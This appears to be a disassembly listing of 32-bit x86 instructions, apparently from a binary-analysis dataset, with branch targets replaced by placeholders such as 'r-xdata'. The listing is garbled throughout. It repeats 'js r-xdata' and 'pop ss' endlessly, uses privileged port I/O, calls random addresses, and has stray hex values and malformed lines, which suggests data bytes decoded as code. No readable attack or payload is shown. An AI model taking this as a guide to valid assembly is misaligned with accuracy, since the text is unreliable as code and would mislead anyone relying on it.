pop ss
or [ eax + 0x17135801 ] dh
popad
js r-xdata
js r-xdata
js r-xdata
js r-xdata
lodsb [ esi ]
int3
js r-xdata
int3
js r-xdata
js r-xdata
mov cl 0xc8
call 0xffffffffe12e7d65
call 0xa3afe6a
pop ss
pop ss
js r-xdata
sbb bl dl
js r-xdata
dec ebx
js r-xdata
call 0xfffffffffb530234
call 0xffffffffad75c039
pop eax
mov eax 0x1716d801
pop ss
js r-xdata
lodsd [ gs : esi ]
js r-xdata
call 0x6ab3e824
jmp 0xffffffffac47e929
mov eax [ edi - 0x52d06e68 ]
sbb al cl
out 0x6c eax
fcmovne st3
call 0xffffffffea0701cb
call 0x22e82d0
sub esi esi
call 0x78be78d7
mov cl 0x1
imul esi [ ebx ] 0x78781717
sbb eax 0x78781717
js r-xdata
js r-xdata
out 0x6d eax
or [ ecx + eax + 0x1717363d ] 0x78
popfd
adc al 0x1
js r-xdata
add [ edx ] edi
pop ss
mov fs [ ecx - 0x4b ]
loopne r-xdata
insd
add [ edi + edx ] dl
pop ss
mov eax 0x17379601
pop ss
js r-xdata
sub eax 0x1e8e8cd
adc dl [ ebx ]
pop ss
pop ss
mov ebx 0xfdd500b8
call 0xffffffffcd710175
call 0x1be787a
mov dl 0xcf
insd
pop ss
js r-xdata
cmp eax 0x78171736
js r-xdata
js r-xdata
mov fs [ ecx - 0x43 ]
js r-xdata
js r-xdata
js r-xdata
js r-xdata
hlt
sub cl 0xe8
call 0x1f84fe74
pop ss
pop ss
call 0xfffffffff912a9f4
js r-xdata
bound ebx [ eax ]
mov edi 0xa4ae61
popad
xchg ebp eax
push es
arpl [ esi ] di
mov fs [ ecx - 0x43 ]
shl [ ebx + 0x10 ] cl
add [ ecx ] edi
jecxz r-xdata
sbb esp edi
insb
add [ eax + 0x1f ] dl
pop ss
pop ss
xor dh 0xc1
pop ss
js r-xdata
js r-xdata

mov edi 0x54cc6c65
0x5b01e8e8 0x171b
js r-xdata
pop ss
js r-xdata
arpl [ esp + ecx * 8 - 0x1eb8fe14 ] bp
call 0x78be78ed
js r-xdata
sbb [ edi ] edx
pop ss
add [ ebp - 0x35 ] eax
call 0x6bb2e8e1
adc dl [ edi ]
pop ss
add [ esi + edi * 8 ] edx
call 0x78be79ec
mov edi 0xcc6c65bf
push esp
mov bl 0x8e
popad
mov ch 0xe0
add [ ebp + 0x7817173b ] ebp
out 0x6d eax
out 0x6c eax
add [ eax + 0x1e ] eax
js r-xdata
cmp edx [ edi ]
pop ss
js r-xdata
lodsd [ esi ]
js r-xdata
pop ss
js r-xdata
or al 0x1
js r-xdata
js r-xdata
pop ss
add [ eax + 0x13 ] ebx
pop ss
js r-xdata
lodsd [ esi ]
js r-xdata
js r-xdata
lodsb [ esi ]
int3
js r-xdata
aaa
pop ss
pop ss
js r-xdata
call 0xffffffffaca97526
int3
mov esi 0xe8c9bc01
call 0xfffffffffa0d6fef
call 0x10f367f5
mov eax 0x13002e63
in al dx
js r-xdata
js r-xdata
js r-xdata
call 0x17615b84
js r-xdata
insb
js r-xdata
pop ss
add [ ebx + 0x1b ] ebx
js r-xdata
js r-xdata
js r-xdata
js r-xdata
or al 0xdb
sub [ edx - 0x529e7170 ] al
popad
lodsd [ esi ]
js r-xdata
out dx eax
push cs
pop ss
pop ss
fld [ eax ]
mov bh 0xb6
mov bl 0x21
sub edi [ eax + 0x78 ]
js r-xdata
insd
imul edx [ eax ] 0xffffffa8
out 0x6a eax
loopne r-xdata
js r-xdata
js r-xdata
mov [ 0x78171734 ] eax
js r-xdata
js r-xdata
add [ ebx + 0x78171734 ] esp
js r-xdata
adc edx [ edi ]
mov al 0x1
js r-xdata
js r-xdata
add ebp ebx
jmp 0x78bee67e
clc
insd
pushfd
adc edx [ edi ]
pop ss
mov eax 0xe8c00101
call 0x78be759e
js r-xdata
js r-xdata
leave
popad
mov ebp 0x8e39630c
popad
mov ebp 0x8e386350
popad
mov ebp 0x153b0152
pop ss
pop ss
add [ ecx + ecx * 8 + 0x6de7e8e8 ] edi
mov fs [ ecx - 0x43 ]
or al 0x63
cmp [ esi + 0x6350bd61 ] ecx
cmp [ esi + 0x152bd61 ] cl
cmp edx [ 0x78781717 ]
sub bh ah
call 0xffffffff9da9c004
loopne r-xdata
and ecx edx
movsd [ edi ] [ esi ]
js r-xdata
pop ebx
js r-xdata
sbb edx [ edi ]
js r-xdata
js r-xdata
js r-xdata
add [ edx + 0x78e8e8cf ] esi
call 0x182e81f6
jle r-xdata
js r-xdata
pop ss
js r-xdata
pop ss
xor al 0x17
js r-xdata
pop eax
js r-xdata
xor [ edi ] dl
xor eax 0x78171730
out dx al
mov ebp 0x170dd201
pop ss
js r-xdata
add [ gs : edi ] dl
mov ch 0x20
mov edi 0xe8cc1801
call 0x37ff03a6
pop ss
jns r-xdata
stc
call 0x78be7b06
js r-xdata
add esi edi
js r-xdata
js r-xdata
pop ss
call 0x1be797d
inc edi
add al 0x17
js r-xdata
pop ss
js r-xdata
js r-xdata
call 0xffffffffb1be7868
add [ ecx + 0x33 ] ebp
pop ss
pop ss
js r-xdata
add [ ecx ] ebp
imul al
add [ ebx + ecx * 8 - 0x18 ] esi
call 0xffffffffe88a7d28
call 0xfffffffffbda00fe
jmp r-xdata
insb
call 0xffffffffdb5e63fe
js r-xdata
call 0x78be7803
js r-xdata
call 0xffffffff9447e7fd
sti
adc [ eax - 0x171f9519 ] ch
js r-xdata
js r-xdata
js r-xdata
mov edi 0x1b6b7b8
pop ss
add dh 0x8e
popad
lodsd [ esi ]
or [ ecx ] al
sti
cmp edx [ edi ]
pop ss
js r-xdata
nop
adc bh [ eax ]
js r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
sub [ edi + 0x78782b21 ] dh
js r-xdata
pop ss
pop ss
js r-xdata
call 0x78be7a97
js r-xdata
js r-xdata
js r-xdata
add [ edi + 0x3c ] edi
pop ss
pop ss
js r-xdata
js r-xdata
mov esi 0xeb8100bf
sub eax 0xbb171731
pop ss
std
inc esp
call 0xffffffff8547e910
imul al
call 0x78be78a7
js r-xdata
mov edi 0xe8eb8100
call 0x78be7812
js r-xdata
add esi edi
js r-xdata
js r-xdata
js r-xdata
js r-xdata
insd
sub [ ecx ] al
sub ecx ebp
call 0x58f369ae
mov eax 0x171b6b01
pop ss
out 0x6c eax
js r-xdata
js r-xdata
imul eax [ eax + ecx * 8 ] 0xffffffbb
mov esi 0x36e900bf
pop ss
js r-xdata
pop ss
js r-xdata
insd
sub [ ecx ] al
push ebx
std
call 0x78be7c0b
mov esi 0xe8ee1601
call 0xfffffffffc726e91
outsb
push esp
js r-xdata
js r-xdata
ja r-xdata
js r-xdata
js r-xdata
popad
insd
xchg esp eax
int3
adc eax 0xa9011717
adc al 0x17
add [ edi + 0x4 ] eax
pop ss
js r-xdata
jmp r-xdata
xor edx ebx
sbb esp edi
insd
sbb bl bl
js r-xdata
js r-xdata
out 0x6d eax
js r-xdata
pop ss
pop ss
js r-xdata
mov bl 0x1
pop ss
js r-xdata
lodsb [ gs : esi ]
js r-xdata
pop ss
arpl [ eax ] si
mov cl 0xb1
popad
mov ch 0x14
insd
xor esp edi
insb
movsd [ edi ] [ esi ]
aas
pop ss
pop ss
sub ah 0x1
add cl dh
js r-xdata
pop ss
arpl [ eax ] dx
insd
pop ss
out 0x6c eax
enter 0xbebb 0xbf
add cl ch
das
lodsd [ esi ]
js r-xdata
js r-xdata
js r-xdata
js r-xdata
call 0xffffffffa847eb9b
or dl [ edi ]
js r-xdata
call 0x78be7aa6
js r-xdata
js r-xdata
pop ss
js r-xdata
add edx edx
or eax 0x1781717
call 0xffffffffe9b06e24
call 0x1df2022a
pop ss
mov cl 0x6d
sub bh ah
insb
shl [ ecx ] 0x17
pop ss
add [ edi - 0x34 ] esi
js r-xdata
adc [ edx ] al
pop ss
pop ss
add [ edx + eax ] eax
pop ss
pop ss
js r-xdata
js r-xdata
js r-xdata
mov fs [ ecx - 0x5b ]
arpl [ ss : eax ] sp
pop ss
js r-xdata
adc [ gs : edi ] edx
sahf
fcom [ edi ]
popfd
or al 0x17
mov edi 0x14ad61c8
shl [ ebp - 0x352ffeec ] 0x1
call 0xffffffffe0c87783
add [ ebp + 0x11 ] esp
pop ss
js r-xdata
mov dh 0xb3
add [ ebx ] ebx
test eax 0x19f00116
pop ss
js r-xdata
sbb [ edi ] dl
js r-xdata
js r-xdata
insb
in al dx
js r-xdata
aas
js r-xdata
js r-xdata
imul ebp [ eax ] 0xffffffea
mov gs [ ebx - 0x30 ]
call 0xfffffffff2106f35
js r-xdata
js r-xdata
in al 0xe7
outsb
adc cl cl
out dx eax
call 0x78be79a3
js r-xdata
out dx eax
call 0x78be7881
js r-xdata
push edi
adc dl [ edi ]
js r-xdata
inc esi
xor eax 0x78781717
js r-xdata
loopne r-xdata
add al 0x1
js r-xdata
push 0xb7e8e8cb
mov dh 0xb3
and [ ebx ] ebp
js r-xdata
popfd
imul eax
call 0xffffffffca4c04e4
call 0xffffffffe76e7128
insd
xor dl [ gs : edi ]
pop ss
pop ss
popfd
mov fs [ ecx - 0x43 ]
sub [ edx + 0x618e9082 ] dh
mov ebp 0x4001b22a
push es
pop ss
pop ss
js r-xdata
pop ss
pop ss
js r-xdata
call 0xffffffffb9477b15
aaa
call 0xfe7abd
xchg esi eax
pop ss
add [ esi ] ch
add eax 0x2c6b1717
in al 0x6d
sub bh ah
insb
bound ebx [ ecx ]
pop ss
pop ss
arpl [ esi - 0x529e4748 ] bp
adc [ ebp - 0x53 ] ah
sbb al 0x1
inc ebp
0xb400e8e8 0x170d
add edi esi
imul edx ecx 0xffffffe8
add [ ecx ] esi
add [ edi ] edx
js r-xdata
js r-xdata
clc
js r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
mov bh 0xb6
mov bl 0x2b
js r-xdata
movsd [ edi ] [ esi ]
adc al 0x1
cmp ecx [ ebx ]
pop ss
pop ss
js r-xdata
pop ss
add [ eax ] esi
and dl [ edi ]
pop ss
js r-xdata
pop ss
mov eax 0xe8f8a500
call 0xffffffffbf2a30e9
add [ ebp - 0x4ee8e8c1 ] ch
insd
sub edi [ eax + 0x78 ]
js r-xdata
pop ss
js r-xdata
sbb al 0x17
pop ss
js r-xdata
and bl [ edi + edx ]
add [ esi + 0x1bea3a5 ] bh
js r-xdata
in al 0x63
js r-xdata
call 0xfffffffffe47b400
adc ebp esp
mov esi 0x17164301
add ebx ebx
pop ss
pop ss
js r-xdata
add [ esi + 0x6be8e8fa ] dl
sub al 0xf0
js r-xdata
pop ss
js r-xdata
call 0xaee049c
pop ss
mov gs [ ebp + 0x1e ]
add [ edx ] ebx
loopne r-xdata
arpl [ edi ] di
js r-xdata
xlat
js r-xdata
js r-xdata
fld [ eax ]
test al 0x1
rdpmc
pop ss
pop ss
js r-xdata
jmp r-xdata
js r-xdata
js r-xdata
cld
add [ ebx + 0x78171731 ] edi
js r-xdata
pop ss
js r-xdata
js r-xdata
sbb ah bh
call 0x78be7d43
arpl [ ebp + 0x1c2201e0 ] sp
pop ss
add edi esp
js r-xdata
mov al 0x1
jns r-xdata
insd
pushfd
adc edx [ edi ]
pop ss
mov eax 0xb8bf17be
mov bh 0xb6
and [ ebx ] ebp
js r-xdata
mov bh 0x21
js r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
call 0x2cb17c00
cld
movsd [ edi ] [ esi ]
mov [ 0xffffffffee1601be ] eax
js r-xdata
movsd [ edi ] [ esi ]
loopne r-xdata
js r-xdata
cli
call 0xfffffffff0726e34
js r-xdata
pop ss
js r-xdata
mov gs [ ebx - 0x2f ]
call 0x174732ca
call 0xffffffffccf2653e
enter 0x286d 0xe7
js r-xdata
js r-xdata
js r-xdata
lodsb [ esi ]
int3
call 0x3421187a
rcr [ ebx ] cl
out 0x6d eax
js r-xdata
pop ss
out 0x6d eax
jecxz r-xdata
out 0x6d eax
arpl [ edx ] si
mov fs [ ecx - 0x4b ]
dec eax
mov ebx 0x78171731
js r-xdata
pop ss
add esi ebp
cmp [ edi ] dl
js r-xdata
sbb al 0x22
pop ss
pop ss
mov cl 0x1
call 0x78be7d52
and [ 0x18deaf9 ] 0x82
js r-xdata
fdivr st3
js r-xdata
push ds
or [ edi - 0x529e714e ] 0x86
mov fs [ ecx - 0x43 ]
mov fs [ ebx + 0x38 ]
pop ss
js r-xdata
xor [ edi ] edx
pop ss
fld [ eax ]
mov fs [ ecx - 0x53 ]
cwde
lodsd [ gs : esi ]
arpl [ eax ] di
js r-xdata
js r-xdata
or [ ecx ] ebx
pop ss
pop ss
js r-xdata
insb
js r-xdata
js r-xdata
popfd
call 0x2362eb8
mov edi 0x1e49d17
fsincos
call 0x78be7ac4
js r-xdata
pop ss
js r-xdata
popad
js r-xdata
js r-xdata
lodsb [ esi ]
int3
imul ebp [ esp ] 0x61
mov esi 0x10ad63d4
mov bh 0xb3
and [ ebx ] ebp
js r-xdata
pop ss
fld [ eax ]
add eax ebx
or dl [ edi ]
pop ss
js r-xdata
pop ss
js r-xdata
out 0x6c eax
or [ ecx ] al
pop ss
pop ss
sub al 0x80
sbb ebp esi
sub [ eax - 0x17d3a1e9 ] 0x1663e8e8
add [ edx ] edx
and eax 0x78781717
pop ss
pop ss
js r-xdata
popad
lodsd [ esi ]
adc [ ecx ] al
mov ecx 0x78171723
out 0x61 eax
js r-xdata
js r-xdata
js r-xdata
js r-xdata
out 0x6c eax
pop edx
adc [ edi ] dl
pop ss
out 0x5f eax
mul [ ebx + 0x1a ]
add [ ebx + 0x63e8e8f6 ] eax
xor al [ edx - 0x4a9e7175 ]
mov al [ 0xffffffffb5618eb3 ]
mov [ 0xffffffffe8e19901 ] al
call 0x66b2ee64
call 0xffffffffe8aa08da
call 0xffffffffb8be7fa5
mov ebx 0xff301bb
pop ss
pop ss
js r-xdata
js r-xdata
js r-xdata
js r-xdata
fld [ eax ]
test cl dh
call 0x6d2d7e08
fsubr st0
call 0xffffffffe9a991b9
call 0xffffffffccda710f
int3
int1
js r-xdata
push ss
push ss
pop ss
js r-xdata
pop ss
pop ss
js r-xdata
0xe8e8
pop ss
arpl [ ebx + ebp * 2 ] ax
add al 0xc8
mov ebx 0xe900bfbe
int3
add [ 0x6be8e8f9 ] cl
js r-xdata
call 0x1a3d033b
pop ss
js r-xdata
call 0x1919b5e5
out 0x6a eax
call 0xffffffffe92e6af4
call 0xfffffffffd7776df
js r-xdata
fucomi st6
arpl [ eax ] sp
insd
pop ss
js r-xdata
cmp dl [ edi ]
pop ss
pop ss
js r-xdata
out 0x6c eax
mov bl 0x82
mov ecx [ esi + 0x6336b561 ]
xor cl [ esi - 0x7db74a9f ]
fwait
arpl [ ecx ] si
add [ eax + 0x78171731 ] ebx
js r-xdata
js r-xdata
js r-xdata
pop ss
js r-xdata
call 0x4a9c30e
mov ecx 0xe914ad2f
mov eax [ 0xffffffffd1171711 ]
xchg ebp eax
adc [ ecx ] al
out dx eax
loop r-xdata
js r-xdata
sub edi [ eax + 0x78 ]
js r-xdata
js r-xdata
js r-xdata
retn
js r-xdata
cmp [ edi ] dl
pop ss
out 0x6c eax
in eax 0xef
call 0xffffffff813288ea
call 0x22eeedf
[ edi ] edx
pop ss
js r-xdata
out dx al
xor al [ ecx ]
add esi esi
call 0x78be7f3a
js r-xdata
or [ ebx + 0x36b5618e ] 0x63
js r-xdata
cmp [ edi ] edx
pop ss
js r-xdata
pop ss
call 0xffffffffcd129993
call 0xfffffffff1cf7214
call 0xffffffffaba4ed1a
sar [ eax - 0x954a119 ] 0x1
mov eax 0x17354601
js r-xdata
js r-xdata
js r-xdata
js r-xdata
add [ edx + 0x78e8e8e4 ] ecx
js r-xdata
add [ ecx ] edx
stc
js r-xdata
js r-xdata
call 0x702defde
xor ebp edi
js r-xdata
inc esp
cmp al 0x17
js r-xdata
enter 0x618e 0xad
add dh [ eax - 0x39fe327e ]
in eax 0x38
pop ss
insd
js r-xdata
call 0xffffffffd8c8ee88
add esi ebp
sbb eax 0x618e1717
lodsd [ esi ]
add [ eax + 0x173c7901 ] dh
pop ss
pop ss
rcl [ ebp - 0x1d10fef0 ] 0x1
call 0x64037e7d
add al 0xb9
js r-xdata
js r-xdata
and eax 0x18deaf9
xor al 0xe8
call 0x21b37d60
out 0x6c eax
js r-xdata
call 0x78be8037
js r-xdata
sub edi [ eax + 0x78 ]
js r-xdata
push eax
sbb al 0x17
pop ss
mov ebx 0x81f51980
test al 0x1
out 0x1e eax
js r-xdata
xchg esp eax
int3
js r-xdata
js r-xdata
js r-xdata
out 0x5f eax
stc
imul ebp [ ecx ] 0xffffffea
add esp edi
0xffffffffbf4a67f0
sub ah 0x1
push cs
sbb [ edi ] dl
pop ss
js r-xdata
js r-xdata
js r-xdata
call 0xfffffffffbee055c
js r-xdata
call 0x78be7bd5
call 0x22a2f51
js r-xdata
sbb [ edi ] edx
js r-xdata
call 0x31b5eedf
std
js r-xdata
js r-xdata
js r-xdata
pop ss
imul ebp [ esp + edi * 8 ] 0x6d
sub bh ah
insb
pop ss
mov fs [ ecx - 0x5b ]
test bl bl
xor eax [ eax ]
mov bl 0xe8
call 0xfffffffff42208a0
sbb [ ebx - 0x67fece9d ] 0x31
pop ss
popad
mov ch 0x48
imul ebp [ esp ] 0xffffff82
clc
lodsd [ gs : esi ]
xor al 0xbb
mov eax 0x17397201
add esp ebp
loopne r-xdata
pop ss
pushfd
0xf082018d 0xe8e8
js r-xdata
js r-xdata
js r-xdata
js r-xdata
test al 0x1
rcl [ esi ] 0x17
js r-xdata
js r-xdata
js r-xdata
js r-xdata
sub [ edi + 0x78782b21 ] dh
int3
lodsb [ esi ]
js r-xdata
js r-xdata
js r-xdata
call 0xffffffffea328577
call 0xfffffffffcff067c
call 0x78be7d81
sti
js r-xdata
int1
js r-xdata
arpl [ esi + 0x54 ] bp
add [ eax + 0x78e8e8fb ] ebp
js r-xdata
js r-xdata
sub al 0xe4
js r-xdata
js r-xdata
out 0x6c eax
sub [ ecx ] al
lahf
pop ss
pop ss
pop ss
js r-xdata
js r-xdata
lodsd [ esi ]
js r-xdata
adc eax 0x117173e
jle r-xdata
js r-xdata
js r-xdata
out 0x6c eax
mov fs [ ecx - 0x6b ]
js r-xdata
pop ss
js r-xdata
js r-xdata
js r-xdata
mov ebx 0x545863be
call 0xfffffffffe47f002
daa
pop ss
pop ss
js r-xdata
das
lodsd [ esi ]
adc al 0xe9
arpl [ ecx + edi * 4 ] ax
add edi edx
js r-xdata
js r-xdata
js r-xdata
sub bh ah
insd
mov bl 0xfb
aas
pop ss
pop ss
mov cl 0x6d
sub bh ah
insd
test al 0xa
pop ss
pop ss
add [ edx + 0xc ] ebp
pop ss
pop ss
js r-xdata
or edx [ edi ]
js r-xdata
call 0x78be7c61
sti
js r-xdata
js r-xdata
fwait
xor [ edi ] dl
pop ss
call 0x1dd108ee
pop ss
pop ss
js r-xdata
sbb bh ah
js r-xdata
mov al 0x37
mov eax 0xec82bbbb
add [ edi - 0x10 ] ebp
call 0x78be7d12
mov ecx 0x1e0a563
js r-xdata
imul eax [ eax + esi * 8 ] 0xbbe8e8eb
add [ edx + 0x7817173b ] ebp
js r-xdata
pop ss
adc [ edi ] dl
out dx al
pushad
in al dx
rcr ebx 0x1
cmp ah [ ebx + 0x29 ]
add [ 0x78e8e8e5 ] eax
js r-xdata
pop ss
imul edx [ ebp - 0x59fe13ec ] 0x37
pop ss
pop ss
js r-xdata
sub [ ecx ] ah
sub edi [ eax + 0x78 ]
js r-xdata
sbb [ ebx + 0x38 ] ah
mov fs [ ecx - 0x43 ]
xchg ebp eax
js r-xdata
jmp 0x4a9f178
js r-xdata
pop ss
add [ ebx + 0x16 ] eax
js r-xdata
js r-xdata
js r-xdata
in al dx
add [ esi + 0x78171737 ] esp
js r-xdata
pop ss
js r-xdata
add ecx eax
push ss
pop ss
js r-xdata
add [ esp + edi + 0x17 ] al
js r-xdata
js r-xdata
js r-xdata
js r-xdata
mov eax 0x9d171782
add al 0x1
and dl ah
call 0x78be7d17
js r-xdata
call 0x78be7bf2
js r-xdata
stc
js r-xdata
push 0xffffffdb
out dx al
js r-xdata
js r-xdata
js r-xdata
stc
js r-xdata
xchg ecx eax
js r-xdata
js r-xdata
arpl [ ebx ] ax
lodsd [ esi ]
loopne r-xdata
add al 0x63
js r-xdata
out 0x6d eax
js r-xdata
pop ss
pop ss
xchg ebp eax
insd
pop ss
pop ss
js r-xdata
call 0xffffffffb0470cf5
aaa
js r-xdata
pop ss
pop ss
inc ebx
push ss
js r-xdata
pop ss
popad
call 0x78be80a6
arpl [ ebp - 0xf90feec ] bp
js r-xdata
js r-xdata
js r-xdata
insb
fpatan
call 0xffffffffa0e9694a
mov ecx 0xb0a363
call 0xffffffffc912afb8
insd
sub bh ah
js r-xdata
js r-xdata
sub al 0xd8
call 0xffffffffb8e419da
add [ ebp + 0x14 ] esp
pop ss
pop ss
js r-xdata
js r-xdata
js r-xdata
mov ebp 0x46b0463
js r-xdata
jmp r-xdata
call 0x78be7b66
js r-xdata
call sub_4608d8
push 0x171715
sbb eax 0x6517173b
lodsd [ esi ]
or al 0xb8
lodsd [ gs : esi ]
pushad
mov eax 0xec82bbbb
mov ebx 0x173af501
and [ ebp + 0x6d ] ah
pop ss
js r-xdata
js r-xdata
call 0xffffffff9b468219
js r-xdata
call 0x78be812b
popad
xchg ebp eax
pop ss
add esi edx
call 0x1ae109aa
pop ss
fisub [ esi ]
out 0x6d eax
sbb eax 0x78781717
js r-xdata
xchg ebp eax
adc al 0xeb
add ebp ecx
js r-xdata
stosb [ edi ]
cmp edx [ edi ]
js r-xdata
and dl [ edi ]
js r-xdata
add al 0x1
adc al 0x1
js r-xdata
outsd
push ss
pop ss
out 0x6c eax
popad
xchg ebp eax
pop edx
add [ edx + 0x78171730 ] esi
js r-xdata
lodsb [ esi ]
js r-xdata
js r-xdata
add [ ebx - 0x4155551e ] 0x1
mov esp 0xe7e8e8c9
js r-xdata
pop ss
js r-xdata
add [ edi ] dl
pop ss
cmp [ edi ] dl
test al 0xfb
js r-xdata
js r-xdata
js r-xdata
in al 0x1
js r-xdata
js r-xdata
js r-xdata
js r-xdata
add [ ebp + 0xb ] esi
js r-xdata
js r-xdata
js r-xdata
js r-xdata
sbb dl [ edi ]
fwait
pop ss
js r-xdata
inc esp
pop ss
pop ss
js r-xdata
js r-xdata
js r-xdata
jmp r-xdata
js r-xdata
pop ss
pop ss
js r-xdata
add [ ebp + 0x1e ] esi
js r-xdata
pop ss
js r-xdata
js r-xdata
outsd
js r-xdata
mov ebx 0x109001bb
pop ss
js r-xdata
or eax 0x6be8e8f9
js r-xdata
js r-xdata
js r-xdata
push esp
sbb eax 0xb11717
mov al 0x0
js r-xdata
js r-xdata
or al 0x8e
js r-xdata
cmp [ eax ] edi
js r-xdata
pop ss
js r-xdata
add [ ecx ] edi
js r-xdata
call 0x78be819a
lea edx [ eax + ebp * 8 ]
aam 0x63
adc [ ebx + 0x39 ] esp
add [ ebx ] edi
movsd [ edi ] gs : [ esi ]
adc al 0xb9
insb
cld
adc eax 0x8d6b1717
adc al 0xe8
pop edi
sub al 0xe8
call 0x39d80b3c
pop ss
js r-xdata
popad
lodsd [ esi ]
mov al 0x82
xchg [ esi + 0x1f4ad61 ] cl
shr ecx cl
add [ edi - 0x8 ] esi
js r-xdata
stc
call 0x14fb6b24
add [ esi - 0x1d ] ch
call 0xffffffffe472752c
mov ebx 0xbf17ea82
add [ ebx + 0x117171a ] bl
salc
js r-xdata
in al 0x63
js r-xdata
arpl [ edi ] bp
add [ esi + esi * 8 - 0x18 ] bh
call 0x2f1d0a7e
pop ss
js r-xdata
xlat
pop ss
js r-xdata
jne r-xdata
add [ edx - 0x2 ] edi
call 0xffffffff82f681cb
test [ esi - 0x4f0d529f ] ecx
add [ esi - 0xb529e72 ] 0x1
insb
loopne r-xdata
add edx [ edi ]
pop ss
int 0x3
js r-xdata
add ecx esp
js r-xdata
pop ss
push ds
js r-xdata
js r-xdata
js r-xdata
js r-xdata
push ss
pop ss
pop ss
add [ edx - 0xc ] ebp
add [ eax + 0x171710 ] edx
push cs
js r-xdata
call 0xffffffffe4726ecd
js r-xdata
js r-xdata
js r-xdata
sub bl 0x1
imul edx [ edi ] 0xffffffc5
mov bh 0xb3
add [ ebp + 0x78e8e8eb ] eax
add [ ebp ] esp
pop ss
js r-xdata
js r-xdata
popad
mov ebp 0xb23163aa
mov fs [ ecx - 0x4b ]
push cs
js r-xdata
pop ss
js r-xdata
cmp [ edi ] dl
js r-xdata
add [ esi ] edx
call 0xffffffff8ebe82da
popad
pop ss
imul ebp [ esp + edi * 8 ] 0x1
pop ss
call 0xffffffff9246f33b
cmp [ edi ] edx
shl [ ebp + 0x263d01e4 ] 0x1
pop ss
js r-xdata
pop ss
js r-xdata
pop ss
mov gs [ ebp + 0x3a ]
add [ ebx + 0x78171715 ] esi
js r-xdata
pop ss
insb
jecxz r-xdata
out 0x6c eax
xor [ ecx ] al
js r-xdata
call 0x182e8b53
jle r-xdata
pop ss
js r-xdata
sbb al 0x17
pop ss
js r-xdata
out 0x6c eax
aad 0x36
pop ss
pop ss
fld [ eax ]
test al 0x1
jae r-xdata
pop ss
lodsd [ gs : esi ]
sbb [ ecx ] al
xor esi 0xffffffe8
call 0x722d316d
sub [ ecx ] eax
pop ebp
out 0xe8 al
call 0x28b38182
add eax edi
or dl [ edi ]
pop ss
js r-xdata
js r-xdata
js r-xdata
js r-xdata
sub [ eax + 0x17344901 ] ch
pop ss
js r-xdata
adc ecx edi
imul ebp [ esp ] 0x1
js r-xdata
pop ss
js r-xdata
push ss
add eax esi
sbb [ edi ] edx
sbb eax 0x78e8e8ff
imul ebp [ eax ] 0xfffffffc
popad
lodsd [ esi ]
adc [ ecx ] al

arpl [ ecx + eax ] ax
mov ah 0xb
js r-xdata
add [ edi + 0x1f ] ebp
pop ss
pop ss
js r-xdata
mov fs [ ecx - 0x53 ]
js r-xdata
add [ edi + 0x78e8e8f9 ] edi
js r-xdata
stosb [ edi ]
arpl [ ecx ] si
mov dl 0x8e
popad
mov ch 0xe
js r-xdata
mov fs [ ecx - 0x6b ]
adc al 0xb7
sub [ edx - 0x171c6eff ] 0xe8
fist [ edi ]
popad
lodsd [ esi ]
push ds
add edi edx
aas
pop ss
pop ss
js r-xdata
mov fs [ ecx - 0x53 ]
xchg ebp eax
sbb cl [ esi + 0x63d6bd61 ]
adc [ ebx + 0x38 ] ah
mov fs [ ecx - 0x4b ]
or cl [ esi - 0x24e36a9f ]
pop ss
mov fs [ ecx - 0x43 ]
test al 0x63
xor bl bl
cmp al [ edx - 0x4a9e7161 ]
loope r-xdata
cld
add [ edi ] edx
mov fs [ ecx - 0x53 ]
cmp al 0xb0
js r-xdata
js r-xdata
mov fs [ ecx - 0x53 ]
pushfd
js r-xdata
add [ edx - 0x7 ] eax
call 0xffffffffb95aae0f
call 0x4e320aa
sti
adc eax 0x78781717
js r-xdata
js r-xdata
call r--data
js r-xdata
js r-xdata
pop ss
js r-xdata
call 0xffffffff944a715b
in al dx
call 0xcd37361
call 0xfffffffff7d40939
call 0xffffffffc4306b6b
jmp 0x78be7fb3
js r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
call 0x78be811a
js r-xdata
push 0xfffffff4
in al 0x1
js r-xdata
pop ss
js r-xdata
add [ ecx ] ch
lodsd [ esi ]
adc al 0x50
call 0xffffffffe82ef481
dec edx
add [ ecx + 0x2d ] esi
pop ss
pop ss
js r-xdata
xor al 0xb0
sbb [ esi + 0x618e1063 ] 0x95
arpl [ ss : esi ] dx
mov fs [ ecx - 0x6b ]
or bl bl
pop ss
add edi edi
cmp [ edi ] dl
pop ss
js r-xdata
insb
xor al 0xe4
call 0x31770d24
pop ss
pop ss
js r-xdata
xor ah [ ebx + 0x2e ]
mov fs [ ecx - 0x53 ]
lodsd [ esi ]
mov cl 0x6d
sub bh ah
insb
mov ebp edi
call 0xfc50c90
pop ss
pop ss
out 0x6d eax
in eax 0x32
pop ss
pop ss
xchg ebp eax
push eax
pop eax
xor [ edx + 0xeb5618e ] esi
js r-xdata
lodsd [ esi ]
add al 0xa5
js r-xdata
cld
call 0x78be82a9
js r-xdata
add [ 0x6be8e8e2 ] ch
sub al 0xe4
adc [ edx - 0x71e99c42 ] al
popad
xchg ebp eax
adc bl bl
pop ss
mov fs [ ecx - 0x6b ]
fld [ eax ]
popad
lodsd [ esi ]
add [ edi + 0x1b ] esp
pop ss
pop ss
pop ss
js r-xdata
jecxz r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
adc al 0xe4
call 0x1f5f0937
pop ss
insb
js r-xdata
mov eax 0x173b7101
js r-xdata
and eax esp
call 0x78be84a7
js r-xdata
insb
int3
jbe r-xdata
out 0x66 eax
jmp r-xdata
js r-xdata
adc eax 0x42001717
js r-xdata
mov [ 0xffffffffad2fa5be ] eax
movsd [ edi ] [ esi ]
js r-xdata
js r-xdata
js r-xdata
xor [ eax - 0x66fe7a7e ] dh
lodsd [ esi ]
js r-xdata
lodsd [ esi ]
jl r-xdata
js r-xdata
js r-xdata
sbb al 0x1
xchg [ edi + edx ] dl
pop ss
js r-xdata
add [ 0x65171736 ] cl
xchg ebp eax
add [ ecx + 0x78e8e8e3 ] edx
imul ecx [ ebp - 0x5a9a17ec ] 0x14
mov ecx 0xe8f94201
add al 0xf0
jmp r-xdata
js r-xdata
pop ss
js r-xdata
js r-xdata
jno r-xdata
js r-xdata
pop ss
pop ss
js r-xdata
sbb [ esi + ecx * 4 - 0x4ffb529f ] 0x82
or [ esi - 0x4ff9529f ] 0xbe018e82
xor [ edi ] edx
pop ss
js r-xdata
call 0xffffffffb046f445
add [ edi ] dl
pop ss
